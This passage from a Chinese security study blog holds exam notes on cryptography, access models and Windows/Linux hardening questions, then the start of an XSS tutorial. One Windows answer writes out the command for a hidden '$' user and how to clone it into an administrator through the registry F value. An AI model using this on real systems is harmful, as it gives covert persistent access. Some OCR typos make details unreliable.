<li><strong>SHA-2</strong>：SHA-256&#x2F;384&#x2F;512，当前标准</li>
<li><strong>SM3</strong>：国密哈希算法，256位输出</li>
</ul>
<h3 id="5-数字签名"><a href="#5-数字签名" class="headerlink" title="5. 数字签名"></a>5. 数字签名</h3><ul>
<li><strong>过程</strong>：哈希→私钥加密→发送</li>
<li><strong>验证</strong>：公钥解密→哈希比对</li>
<li><strong>算法</strong>：RSA、DSA、ECDSA、SM2</li>
</ul>
<h3 id="6-安全协议"><a href="#6-安全协议" class="headerlink" title="6. 安全协议"></a>6. 安全协议</h3><ul>
<li><strong>Kerberos</strong>：基于票据的认证协议</li>
<li><strong>IPsec</strong>：网络层安全协议</li>
<li><strong>SSL&#x2F;TLS</strong>：传输层安全协议</li>
</ul>
<h3 id="7-安全模型"><a href="#7-安全模型" class="headerlink" title="7. 安全模型"></a>7. 安全模型</h3><ul>
<li><strong>DAC</strong>：自主访问控制</li>
<li><strong>MAC</strong>：强制访问控制<ul>
<li>BLP：保护机密性</li>
<li>Biba：保护完整性</li>
</ul>
</li>
<li><strong>RBAC</strong>：基于角色的访问控制（同时具有强制访问控制和自主访问控制属性）</li>
</ul>
<hr>
<h2 id="十二、案例分析"><a href="#十二、案例分析" class="headerlink" title="十二、案例分析"></a>十二、案例分析</h2><h3 id="1-安全配置"><a href="#1-安全配置" class="headerlink" title="1.安全配置"></a>1.安全配置</h3><h4 id="Windows安全配置"><a href="#Windows安全配置" class="headerlink" title="Windows安全配置"></a>Windows安全配置</h4><ol>
<li>默认情况下，终端服务接入服务器时，登录对话框中会显示上次登录的账号名。为增强系统安全，通过修改注册表，将<br>HKLM\software\MicrosoftIWindowsNT\CurrentVersion\winlogon\DontdisplayLastUserName下的REG_SZ的键值改成多少?<br><img src="/image.png" alt="alt text"></li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">问题1：请写出查看计算机上的用户帐号列表的命令</span><br><span class="line">net user / net users</span><br><span class="line"></span><br><span class="line">问题2：请写出创建一个用户名为51cto$，口令是123456的命令</span><br><span class="line">net user &quot;51cto$&quot; &quot;123456&quot; /add</span><br><span class="line">用户名 51cto$ 包含特殊字符 $（在命令行中 $ 是环境变量符号），必须用双引号包裹整个用户名和密码，否则系统会报错（如 The user name could not be found）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">问题3：此时是否能够使用问题1中的net命令查看到刚刚创建的51cto$用户?为什么?</span><br><span class="line">不能；用户名最后用$符号，则创建的用户是隐藏用户，不可以单纯使用net user 查看</span><br><span class="line"></span><br><span class="line">问题4：管理员账号Administrator对应图4-1注册表中Users键值下的哪一项?</span><br><span class="line">默认情况下 Users键值下的000001F4是管理员账号Administrator，(000001F5是Guest账号)</span><br><span class="line"></span><br><span class="line">问题5：图4-1中，51cto$账号对应Users键值下的000003F0，若需要将51cto$账号克隆为管理员账号，需要复制管理员账号的哪个键值?</span><br><span class="line">F (细节)</span><br><span class="line"></span><br><span class="line">问题6：使用克隆账号登入到该计算机，使用什么命令查看当前用户的有效用户名?</span><br><span class="line">whoami</span><br><span class="line"></span><br><span class="line">1：启用该策略，不显示上次登录的用户名。</span><br><span class="line">0（默认值）：显示上次登录的用户名。 </span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>某公司安全管理员小工针对针对公司中的两个连接了VPN的电脑PC1和PC2进行巡查，图3-1是PC1的windows系统中”事件查看器”的事件截图，图3-2为图3-1中第二条事件(红框标记)的详细信息:图3-3是PC2的网络抓包经过某条件语句过滤后的截图。</li>
</ol>
<p><img src="/image-1.png" alt="alt text"></p>
<p><img src="/image-2.png" alt="alt text"></p>
<p><img src="/image-3.png" alt="alt text"></p>
<ul>
<li>问题1：Windows 日志类型，及其查看方式</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1.系统日志：驱动加载失败、系统服务启动异常、硬件错误。</span><br><span class="line">2.安全日志：登录成功/失败、权限变更、策略修改、文件访问审计（需提前配置审核策略）。</span><br><span class="line">3.应用程序日志：软件崩溃、许可证错误、应用服务启动失败</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">打开事件查看器：eventvwr.msc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 查看应用程序日志（最新 10 条）</span><br><span class="line">Get-EventLog -LogName Application -Newest 10</span><br><span class="line"></span><br><span class="line"># 查看安全日志（按事件 ID 筛选）</span><br><span class="line">Get-WinEvent -LogName Security | Where-Object &#123;$_.Id -eq 4624&#125;  # 4624=成功登录</span><br><span class="line"></span><br><span class="line"># 查看系统日志（按时间筛选）</span><br><span class="line">Get-WinEvent -LogName System -After (Get-Date).AddHours(-24)  # 过去24小时</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>问题2：图3-1的事件ID为4650，请结合任务类别，判断导致上述日志的最有可能的情况。<br>备选项:</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">A.IPSec主模式协商失败 B.建立了IPsec主模式安全关联</span><br><span class="line">C.IPsec主模式安全关联已结束D.IPSec采用了传输模式成功</span><br><span class="line"></span><br><span class="line">4650</span><br><span class="line">IPsec主模式</span><br><span class="line">主模式安全关联已建立</span><br><span class="line">（协商成功）</span><br><span class="line"></span><br><span class="line">4651</span><br><span class="line">IPsec传输模式</span><br><span class="line">传输模式安全关联已建立</span><br><span class="line">（协商成功）</span><br><span class="line"></span><br><span class="line">4652</span><br><span class="line">IPsec主模式</span><br><span class="line">主模式协商失败</span><br><span class="line"></span><br><span class="line">4653</span><br><span class="line">IPsec传输模式</span><br><span class="line">传输模式协商失败</span><br><span class="line"></span><br><span class="line">4654</span><br><span class="line">IPsec主模式</span><br><span class="line">主模式安全关联已删除（结束）</span><br><span class="line"></span><br><span class="line">4655  </span><br><span class="line">IPsec传输模式</span><br><span class="line">传输模式安全关联已删除</span><br><span class="line">（结束）</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<ul>
<li>问题3：安全事件中的任务类别中IPSec是一种VPN，VPN提供的安全服务主要包括哪些?</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">（1）IPsec VPN 是属于三层协议隧道技术，网络层VPN</span><br><span class="line">（2）远程连接服务，数据加密传输</span><br><span class="line"></span><br><span class="line">VPN主要的安全服务有以下3种:</span><br><span class="line">保密性服务( Confidentiality):防止传输的信息被监听;</span><br><span class="line">完整性服务( lntegrity):防止传输的信息被修改;</span><br><span class="line">认证服务( Authentication):提供用户和设备的访问认证,防止非法接入。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>问题四：请写出建立VPN连接的两端ip地址</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">src: 192.168.0.96</span><br><span class="line">dst: 218.87.227.2</span><br></pre></td></tr></table></figure>

<ul>
<li>问题五：如果要在Wireshark当中过滤出如图3-3的流量分组，请写出在显示过滤框中应输入的过滤表达式。</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">图中的所有分组都ip地址172.16.14.253有关，所以可以设定ip.addr == 172.16.14.253来过滤。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>问题六：通过图3-3的分组分析，<br>网工认为PC2的这些分组是通过L2TP封装了的，但依然存在安全风险，该风险针对的是三大安全目标即保密性、完整性、可用性中的哪个</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">保密性</span><br></pre></td></tr></table></figure>

<ul>
<li>问题七：根据第二条事件(红框标记)的详细信息图3-2，可以判断是PC1通过12tpoveripsec<br>:VPN连接到对端，请写出你的判断依据?</li>
</ul>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">L2TP采用专用的隧道协议，该协议运行在UDP的1701端口，图3-2中描述的端口号是1701，</span><br><span class="line">另外通过前面描述的!PSec主模式以及&lt;Dala Name=EspAuhTvpe&gt;%6%16393&lt;/Data&gt;可以判断是通过IPSec提供加密服务。</span><br></pre></td></tr></table></figure>


<hr>
<h4 id="Linux安全配置"><a href="#Linux安全配置" class="headerlink" title="Linux安全配置"></a>Linux安全配置</h4><ol>
<li>在网络信息化环境中，资源不是无限制开放的，而是在一定约束条件下，用户才能使用。一种技术。访问控制是几平所有系统都雲要用到的-访问控制通常按用户身份及其所归属的某项定义组来限制用户对某些信息项的访问，或限制对某些控制功能的使用的一种技术。</li>
</ol>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">为适应不同应用场景的访问控制需求，访问控制参考模型不断演变，形成各种各样的访问控制模型，主要有自主访问控制模型、强制访问控制模型、</span><br><span class="line">基于角色的访问控制模型、</span><br><span class="line">基干属性的访问控制模型等。</span><br><span class="line">(1)适合用于操作系统、数据库系统的资源访问的控制模型有:</span><br><span class="line">(2)适合于分布式网络环境和Web服务的模型访问控制模型有:</span><br><span class="line"></span><br><span class="line">(1) 基于角色的访问控制模型， 自主访问控制模型， 强制访问控制模型</span><br><span class="line">(2) 基于属性访问控制模型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">某linux主机上可以看到如下所示的信息: -rwxr-x--- 1root bin 3853 Aug 105:49 javac</span><br><span class="line">则表明采用此种保护位方案的访问控制模型是：(3) </span><br><span class="line">基于角色的访问控制模型（错误）  基于列的访问控制模型（白名单）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">某公司的部分重要资料部署在Apache服务器的Nana/secret日录下，要求只有公司内部的研发部门可以访问，研发部门的子网是172.28.31.0/24，则信息安全工程师应该在Apache的</span><br><span class="line">配置文件(4)中进行修改，文件中的控制配置如下所示，请根据要求补充完整。</span><br><span class="line">&lt;Directory /yanfa/secret&gt;</span><br><span class="line">&lt;Limit GET POST&gt;</span><br><span class="line">deny from (5)</span><br><span class="line">allow from(6)</span><br><span class="line">&lt;/Limit&gt;</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">(5) all</span><br><span class="line">(6) 172.28.31.0/24</span><br><span class="line"></span><br><span class="line">Windows IIS FTP服务器提供了三种访问限制技术手段，分别是什么?</span><br><span class="line">1.实现用户账号认证</span><br><span class="line">2.匿名访问控制</span><br><span class="line">3.IP地址限制</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>某公司的网站服务器系统为Linux&#x2F;UNIX，李工作为公司的安全运维工程师，由于工作需要，需要随时随地对服务器远程开展处置工作。李工使用的PC的IP地址为192.168.1.23</li>
</ol>
<p><img src="/image-6.png" alt="alt text"></p>
<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">(1)李工可以通过两种远程方式访问服务器进行运维，请写出两种方式?</span><br><span class="line">  ssh telnet</span><br><span class="line"></span><br><span class="line">(2)请写出上述两种通信协议的默认端口号。</span><br><span class="line">  ssh:22 telnet:23</span><br><span class="line"></span><br><span class="line">(3)出于安全考虑，李工应该选择那种方式进行远程运维?</span><br><span class="line">  ssh</span><br><span class="line"></span><br><span class="line">(4)请写出李工可以选择远程安全登录运维管理的开源工具。</span><br><span class="line">  OpenSSH</span><br><span class="line"></span><br><span class="line">李亮通过SSH登入到服务后，执行cat /etc/passwd 命今点显示如图2-1的画面。文件中的一行记录对应着一个用户,每行记录用冒号(:)分隔为 7 个字段。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(1)第2个字段“X&quot;表示用来验证用户合法性的口令，真正的口令存放在什么文件中?(写出完整路径和名称)</span><br><span class="line">  /etc/shadow</span><br><span class="line"></span><br><span class="line">(2)请写出图2-1中权限最低的用户名称。</span><br><span class="line">  bin</span><br><span class="line">(3)请写出图2-1中系统允许远程登陆的用户名称。</span><br><span class="line">  user1 user2 root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">UID=0→ root(最高权限)</span><br><span class="line">UID=1~999→系统账户(如 bin, daemon, sshd)</span><br><span class="line">普通用户UID&gt;1000</span><br><span class="line"></span><br><span class="line">若：/bin/bash /bin/sh /usr/bin/zsh 等可交互 Shell → 允许登录</span><br><span class="line">若：/sbin/nologin/bin/false→禁止登录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Linux中可通过/etc/hosts,allow和/etc/hosts,denv这两个文件分许和禁止远程丰机对本地服务的访问运维。李工对服务器的这两个进行配置，实现禁止除了李工之外的任何主机进行远程，</span><br><span class="line">请写出在这两个文件中加入的配置。</span><br><span class="line"></span><br><span class="line">在/etc/hosts.deny中加入sshd:all:deny(:deny可以不写)</span><br><span class="line">在/etc/hosts.allow中加入sshd:192.168.1.23:allow(:allow可以不写)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">李工通过网络安全监测对系统的网络活动和内部活动进行分析，获取系统当前的状态信息，以发现有可能的异常行为。</span><br><span class="line">(1)李工需要查看系统的活动进程，可以使用什么命令查看?</span><br><span class="line">  ps</span><br><span class="line"></span><br><span class="line">(2)李工需要查看系统中在线的用户信息，可以使用什么命令查看?</span><br><span class="line">  who</span><br><span class="line"></span><br><span class="line">(3)李工需要查看系统中的地址解析缓存表，可以使用什么命令查看?</span><br><span class="line">  arp</span><br><span class="line"></span><br><span class="line">(4)李工需要检查系统中进程使用的文件、tcp/udp端口、用户等相关信息，可以使用什么命令查看?</span><br><span class="line">  lsof</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Linux服务器的日志文件可提供审计，有助于系统管理员及时发现系统入侵行为或系统安全隐患。</span><br><span class="line">李工根据安全需求查看相关日志:</span><br><span class="line">(1)查看每一次用户登录和注销的历史信息的日志文件是哪个?</span><br><span class="line">(2)查看不良的登入尝试记录的日志文件是哪个?</span><br><span class="line"></span><br><span class="line">(1)-(2)备选答案:</span><br><span class="line">A. lastlog</span><br><span class="line">B. loginlog</span><br><span class="line">C.utmp</span><br><span class="line">D.wtmp</span><br><span class="line">E.sulog</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">审计机制是 UNIXinux系统安全的重要组成部分,审计有助于系统管理员及时发现系统入侵行为或系统安全隐患。不同版本的 UNIXLinux日志文件的目录是不同的,早期版本UNx的审计日志目录放在/usr/adm:较新版本的在/arladm; Solaris,Linux和BSD在 UNIXarlog。常见日志文件如下:lastlog:记录用户最近成功登录的时间;</span><br><span class="line">·loginlog:不良的登录尝试记录;</span><br><span class="line">·messages:记录输出到系统主控台以及由 syslog系统服务程序产生的消息；</span><br><span class="line">·utmp:记录当前登录的每个用户;</span><br><span class="line">·utmpx:扩展的utmp;</span><br><span class="line">·wtmp:记录每一次用户登录和注销的历史信息;</span><br><span class="line">·wimp:扩展的wmp;</span><br><span class="line">·vold.log:记录使用外部介质出现的错误;</span><br><span class="line">·xferkig:记录fp的存取情况,</span><br><span class="line">·sulog:记录su命令的使用情况;</span><br><span class="line">·acct:记录每个用户使用过的命令。</span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/zhuzhuxia.jpg">
      <meta itemprop="name" content="ZQ-Rooie-Hacker">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | ZQ-Rookie-Hacker's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">XSS漏洞基础</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-01-18 12:00:00" itemprop="dateCreated datePublished" datetime="2025-01-18T12:00:00+08:00">2025-01-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-05-18 12:00:00" itemprop="dateModified" datetime="2025-05-18T12:00:00+08:00">2025-05-18</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">网络安全</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web/" itemprop="url" rel="index"><span itemprop="name">Web</span></a>
        </span>
          ，
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/Web/XSS%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">XSS漏洞</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>11k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>37 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本人是个网安菜鸡，这是写的第一篇有关XSS漏洞学习的博客，请多多指教。</p>
<p>1.由于不可以在非代码区书写完整的html标签 用   [ ]  代替 &lt;  &gt;</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sript</span>&gt;</span>   --&gt;   [script]  </span><br></pre></td></tr></table></figure>
<p>2.作者用的是chrome浏览器，不同的浏览器回显的网页代码颜色或是容错规则方面有差异</p>
<hr>
<h1 id="一、xss漏洞是什么？"><a href="#一、xss漏洞是什么？" class="headerlink" title="一、xss漏洞是什么？"></a>一、xss漏洞是什么？</h1><p>XSS（跨站脚本攻击，Cross-Site Scripting）是一种常见的Web安全漏洞，攻击者通过向网页中注入恶意脚本代码，当其他用户访问该页面时，这些脚本会在其浏览器中执行，从而导致数据泄露、会话劫持、钓鱼攻击等安全问题</p>
<hr>
<h1 id="二、xss漏洞的基本知识"><a href="#二、xss漏洞的基本知识" class="headerlink" title="二、xss漏洞的基本知识"></a>二、xss漏洞的基本知识</h1><h2 id="1-HTML-中的「文本标签」"><a href="#1-HTML-中的「文本标签」" class="headerlink" title="1.HTML 中的「文本标签」"></a>1.HTML 中的「文本标签」</h2><blockquote>
<p>通常指用于包裹文本内容的标签，例如：<br>段落标签：p、h1-h6<br>行内容器：span、em、strong<br>列表项：li<br>其他文本容器：div、section（虽然通用，但常用于包裹文本块）</p>
</blockquote>
<hr>
<h2 id="2-script-嵌套在不同标签下的脚本运行情况"><a href="#2-script-嵌套在不同标签下的脚本运行情况" class="headerlink" title="2.script 嵌套在不同标签下的脚本运行情况"></a>2.script 嵌套在不同标签下的脚本运行情况</h2><h3 id="脚本执行的核心规则"><a href="#脚本执行的核心规则" class="headerlink" title="*脚本执行的核心规则"></a>*脚本执行的核心规则</h3><ul>
<li>浏览器纠错机制<br>HTML 解析器会尝试修复非法嵌套，将 script 移到允许的位置（如父容器外部），确保脚本执行。</li>
<li>内容模型（Content Model）限制<br>每个 HTML 标签有允许嵌套的内容类型（如流内容、短语内容等），非法嵌套可能导致 DOM 结构变化。</li>
<li>安全策略影响<br>如 CSP（内容安全策略）会阻止未授权的内联脚本或外部资源。</li>
</ul>
<h3 id="补充知识"><a href="#补充知识" class="headerlink" title="*补充知识"></a>*补充知识</h3><blockquote>
<p>1.浏览器在解析javascript的属性值时，是支持十进制或是十六进制的unicode编码<br>2.URL编码，也叫百分号编码，是用来将特殊字符转换成可以在URL中安全使用的格式，通常用%加上两位的十六进制数来表示<br>3. alert(“ “)  alert(‘ ‘)   双引号与单引号均可以<br> 4. console.log(‘ ‘)    &#x2F;(“ “)    控制台输出<br>5.url编码的字符-&gt;搜索<br>6.多个键值对的输入用&amp;分割<br>7.align（对齐）属性或相关标签（比如 [div align&#x3D;”center”]），这在早期的 HTML 中用于对齐内容，但现代开发中已不推荐使用，建议改用 CSS 实现对齐。<br>8.前后符号最好都闭合，防止浏览器非预期‘容错’，也可以活动注释符号<br>9.src，href<br>10.gfi文件格式</p>
</blockquote>
<p>在 XSS 攻击或前端开发中，<code>&lt;script&gt;</code> 标签的<strong>嵌套位置</strong>和<strong>上下文环境</strong>会直接影响脚本的执行行为。以下是不同场景下的详细分析：</p>
<hr>
<p>在 XSS 攻击或前端开发中，<code>&lt;script&gt;</code> 标签的<strong>嵌套位置</strong>和<strong>上下文环境</strong>会直接影响脚本的执行行为。以下是不同场景下的详细分析：</p>
<hr>
<h3 id="1-标签的标准位置"><a href="#1-标签的标准位置" class="headerlink" title="1. &lt;script&gt; 标签的标准位置"></a>1. <code>&lt;script&gt;</code> 标签的标准位置</h3><p>HTML 规范允许 <code>&lt;script&gt;</code> 标签出现在 <strong><code>&lt;head&gt;</code></strong> 或 <strong><code>&lt;body&gt;</code></strong> 中，但行为略有差异：</p>
<ul>
<li><strong>在 <code>&lt;head&gt;</code> 中</strong>：<ul>
<li>脚本默认<strong>同步加载和执行</strong>，会阻塞 HTML 解析。</li>
<li>适合初始化代码或依赖库（如 jQuery）。</li>
</ul>
</li>
<li><strong>在 <code>&lt;body&gt;</code> 末尾</strong>：<ul>
<li>延迟加载，避免阻塞页面渲染。</li>
<li>适合操作 DOM 的代码（需确保 DOM 已加载）。</li>
</ul>
</li>
</ul>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Head 中的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span>内容<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Body 末尾的脚本&quot;</span>);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-嵌套在其他标签内"><a href="#2-嵌套在其他标签内" class="headerlink" title="2. &lt;script&gt; 嵌套在其他标签内"></a>2. <code>&lt;script&gt;</code> 嵌套在其他标签内</h3><h4 id="场景-1：普通容器标签（如-、）"><a href="#场景-1：普通容器标签（如-、）" class="headerlink" title="场景 1：普通容器标签（如 &lt;div&gt;、&lt;span&gt;）"></a>场景 1：普通容器标签（如 <code>&lt;div&gt;</code>、<code>&lt;span&gt;</code>）</h4><ul>
